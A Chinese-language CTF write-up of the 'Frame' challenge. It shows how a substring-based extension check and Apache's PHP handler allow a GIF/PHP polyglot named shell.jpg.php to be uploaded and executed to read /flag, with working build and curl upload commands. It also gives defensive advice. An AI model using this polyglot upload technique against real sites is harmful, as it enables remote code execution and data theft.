# Frame

## 题目简述

应用接收一张图片，保存到 `uploads/` 后把它放进相框。上传逻辑同时检查文件小于 2 MB、`getimagesize()` 能识别，以及原文件名中出现 `.jpg`、`.jpeg`、`.png` 或 `.gif`：

```php
$allowed_extensions = array(".jpg", ".jpeg", ".png", ".gif");
$filename = $_FILES["fileToUpload"]["name"];
$target_file = "uploads/" . bin2hex(random_bytes(8))
             . "-" . basename($filename);

foreach ($allowed_extensions as $extension) {
  if (strpos(strtolower($filename), $extension) !== false)
    $has_extension = true;
}

if (getimagesize($tmpname) && $has_extension)
  move_uploaded_file($tmpname, $target_file);
```

Apache 对扩展名 `php` 注册了 CGI handler，而保存后的文件名仍保留用户给出的结尾。因此可以上传“内容是真图片、名称中含图片扩展名、最终扩展名却是 `.php`”的 polyglot，取得 nsjail 内 PHP 代码执行并读取 `/flag`。

## 解题过程

### 绕过两个表面检查

扩展名判断使用 `strpos`，只要求允许字符串在文件名任意位置出现，并没有验证最终后缀。名称 `shell.jpg.php` 同时满足：

```text
包含 ".jpg"  -> 通过 $has_extension
末尾为 ".php" -> Apache 按 PHP CGI 执行
```

`getimagesize()` 检查的是临时文件内容，而不是文件名。先准备一个真实的 1×1 GIF，再在 GIF 结束标记后追加 PHP；图片解析器仍能读取前面的合法图像，PHP 则会扫描并执行后面的 `<?php ... ?>`：

```bash
printf '%s' \
  'R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==' \
  | base64 -d > shell.jpg.php

printf '%s' \
  '<?php echo file_get_contents("/flag"); ?>' \
  >> shell.jpg.php
```

这里不需要 webshell 或系统命令；直接调用 `file_get_contents` 能把利用面缩到最小。

### 上传并访问随机文件名

提交 multipart 表单时必须同时提供文件字段和 `submit` 字段，因为后端以 `isset($_POST["submit"])` 作为入口：

```bash
curl -s \
  -F 'fileToUpload=@shell.jpg.php;type=image/gif' \
  -F 'submit=Upload Image' \
  'https://TARGET/'
```

成功响应会原样给出随机化后的资源路径，例如：

```html
<img src='uploads/8f6c...-shell.jpg.php'
     alt='Your image failed to load :(' id='submission'>
```

访问该路径即可让 Apache 的 `AddHandler application/x-nsjail-httpd-php php` 把文件交给 PHP CGI：

```bash
curl -s 'https://TARGET/uploads/8f6c...-shell.jpg.php'
```

PHP 运行在隔离 chroot 中，但 Dockerfile 已把题目 flag 复制为其中的 `/flag`，所以响应为：

```text
uiuctf{th1nk1ng_0uts1de_th3_fr4m3}
```

## 方法总结

- 核心技巧：用合法图片与 PHP 尾部载荷组成 polyglot，同时利用“包含允许扩展名”和“Apache 按最终扩展名选 handler”之间的解析差异实现上传 RCE。
- 识别信号：服务端保留原始文件名、允许扩展名用子串搜索、`getimagesize` 只校验内容、上传目录又位于可直接访问且启用 PHP handler 的 DocumentRoot 下。
- 复用要点：安全上传应使用严格的最终扩展名白名单、服务端生成不带用户后缀的文件名，并把上传目录放到不可执行位置；只验证 MIME 或图片头无法阻止 polyglot。
